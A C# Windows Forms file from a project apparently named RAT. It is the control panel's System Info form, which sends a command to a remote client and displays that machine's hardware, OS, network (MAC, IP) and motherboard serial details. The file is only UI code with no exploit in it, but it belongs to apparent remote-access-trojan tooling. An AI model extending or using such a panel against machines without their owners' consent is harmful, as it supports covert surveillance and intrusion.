using System;
using System.Drawing;
using System.Windows.Forms;
using System.Threading.Tasks;
using Newtonsoft.Json;
using RAT.Shared.Models;

namespace RAT.ControlPanel.Forms
{
    public partial class frmSystem : Form
    {
        private ClientInfo client;
        private MainForm mainForm;
        
        public frmSystem(ClientInfo client, MainForm mainForm)
        {
            this.client = client;
            this.mainForm = mainForm;
            InitializeComponent();
            this.Text = $"System Info - {client.ClientId}";
            
            // MainForm에 이 폼 등록
            mainForm.RegisterForm(client.ClientId, this);
        }
        
        private async void frmSystem_Load(object sender, EventArgs e)
        {
            await LoadSystemInfo();
        }
        
        // ===== Load System Info =====
        
        private async Task LoadSystemInfo()
        {
            lblStatus.Text = "Loading system information...";
            await SendCommand(new { type = "system_info_full" });
        }
        
        private async void btnRefresh_Click(object sender, EventArgs e)
        {
            treeView1.Nodes.Clear();
            await LoadSystemInfo();
        }
        
        // ===== 명령 전송 =====
        
        private async Task SendCommand(object command)
        {
            await mainForm.SendCommand(client, command);
        }
        
        // ===== 응답 처리 =====
        
        public void HandleResponse(dynamic response)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => HandleResponse(response)));
                return;
            }
            
            string type = response.type.ToString();
            
            if (type == "system_info_full")
            {
                DisplaySystemInfo(response.data);
                lblStatus.Text = $"System information loaded at {DateTime.Now:HH:mm:ss}";
            }
        }
        
        // ===== Display System Info =====
        
        private void DisplaySystemInfo(dynamic data)
        {
            treeView1.Nodes.Clear();
            
            try
            {
                // OS Information
                var osNode = new TreeNode("Operating System");
                osNode.Nodes.Add($"OS: {data.os?.name ?? "N/A"}");
                osNode.Nodes.Add($"Version: {data.os?.version ?? "N/A"}");
                osNode.Nodes.Add($"Architecture: {data.os?.architecture ?? "N/A"}");
                osNode.Nodes.Add($"Build: {data.os?.build ?? "N/A"}");
                osNode.Nodes.Add($"Install Date: {data.os?.installDate ?? "N/A"}");
                treeView1.Nodes.Add(osNode);
                
                // CPU Information
                var cpuNode = new TreeNode("Processor");
                cpuNode.Nodes.Add($"Name: {data.cpu?.name ?? "N/A"}");
                cpuNode.Nodes.Add($"Cores: {data.cpu?.cores ?? "N/A"}");
                cpuNode.Nodes.Add($"Threads: {data.cpu?.threads ?? "N/A"}");
                cpuNode.Nodes.Add($"Speed: {data.cpu?.speed ?? "N/A"} MHz");
                cpuNode.Nodes.Add($"Architecture: {data.cpu?.architecture ?? "N/A"}");
                treeView1.Nodes.Add(cpuNode);
                
                // Memory Information
                var memNode = new TreeNode("Memory");
                memNode.Nodes.Add($"Total: {data.memory?.total ?? "N/A"} GB");
                memNode.Nodes.Add($"Available: {data.memory?.available ?? "N/A"} GB");
                memNode.Nodes.Add($"Used: {data.memory?.used ?? "N/A"} GB");
                memNode.Nodes.Add($"Usage: {data.memory?.usage ?? "N/A"}%");
                treeView1.Nodes.Add(memNode);
                
                // GPU Information
                if (data.gpu != null)
                {
                    var gpuNode = new TreeNode("Graphics");
                    if (data.gpu is System.Collections.IEnumerable)
                    {
                        foreach (var gpu in data.gpu)
                        {
                            var card = new TreeNode($"{gpu.name ?? "Unknown GPU"}");
                            card.Nodes.Add($"Memory: {gpu.memory ?? "N/A"}");
                            card.Nodes.Add($"Driver: {gpu.driver ?? "N/A"}");
                            gpuNode.Nodes.Add(card);
                        }
                    }
                    treeView1.Nodes.Add(gpuNode);
                }
                
                // Disk Information
                if (data.disks != null)
                {
                    var diskNode = new TreeNode("Disks");
                    if (data.disks is System.Collections.IEnumerable)
                    {
                        foreach (var disk in data.disks)
                        {
                            var drive = new TreeNode($"{disk.name ?? "Unknown"} ({disk.letter ?? "?"})");
                            drive.Nodes.Add($"Type: {disk.type ?? "N/A"}");
                            drive.Nodes.Add($"Total: {disk.total ?? "N/A"} GB");
                            drive.Nodes.Add($"Free: {disk.free ?? "N/A"} GB");
                            drive.Nodes.Add($"Used: {disk.used ?? "N/A"} GB");
                            drive.Nodes.Add($"Usage: {disk.usage ?? "N/A"}%");
                            diskNode.Nodes.Add(drive);
                        }
                    }
                    treeView1.Nodes.Add(diskNode);
                }
                
                // Network Information
                if (data.network != null)
                {
                    var netNode = new TreeNode("Network");
                    if (data.network is System.Collections.IEnumerable)
                    {
                        foreach (var adapter in data.network)
                        {
                            var adapterNode = new TreeNode($"{adapter.name ?? "Unknown Adapter"}");
                            adapterNode.Nodes.Add($"MAC: {adapter.mac ?? "N/A"}");
                            adapterNode.Nodes.Add($"IP: {adapter.ip ?? "N/A"}");
                            adapterNode.Nodes.Add($"Status: {adapter.status ?? "N/A"}");
                            netNode.Nodes.Add(adapterNode);
                        }
                    }
                    treeView1.Nodes.Add(netNode);
                }
                
                // BIOS Information
                if (data.bios != null)
                {
                    var biosNode = new TreeNode("BIOS");
                    biosNode.Nodes.Add($"Manufacturer: {data.bios.manufacturer ?? "N/A"}");
                    biosNode.Nodes.Add($"Version: {data.bios.version ?? "N/A"}");
                    biosNode.Nodes.Add($"Release Date: {data.bios.releaseDate ?? "N/A"}");
                    treeView1.Nodes.Add(biosNode);
                }
                
                // Motherboard Information
                if (data.motherboard != null)
                {
                    var mbNode = new TreeNode("Motherboard");
                    mbNode.Nodes.Add($"Manufacturer: {data.motherboard.manufacturer ?? "N/A"}");
                    mbNode.Nodes.Add($"Product: {data.motherboard.product ?? "N/A"}");
                    mbNode.Nodes.Add($"Serial: {data.motherboard.serial ?? "N/A"}");
                    treeView1.Nodes.Add(mbNode);
                }
                
                treeView1.ExpandAll();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error displaying system info: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}
